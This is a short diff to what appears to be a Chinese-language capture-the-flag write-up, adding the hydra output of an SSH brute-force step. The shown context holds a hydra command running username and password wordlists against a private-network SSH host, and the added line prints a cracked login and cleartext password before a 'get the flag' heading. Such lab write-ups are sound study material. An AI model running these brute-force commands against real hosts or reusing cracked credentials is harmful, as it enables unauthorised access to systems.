@@ -78,6 +78,8 @@ if __name__ == '__main__':
 # 爆破SSH
 ```C
 hydra -L user_20240416.txt -P pass_20240416.txt -t 16 ssh://192.168.44.133 
+
+[22][ssh] host: 10.0.2.15   login: mike   password: 6G3UCx6aH6UYvJ6m
 ```
 # 拿Flag
 ```C
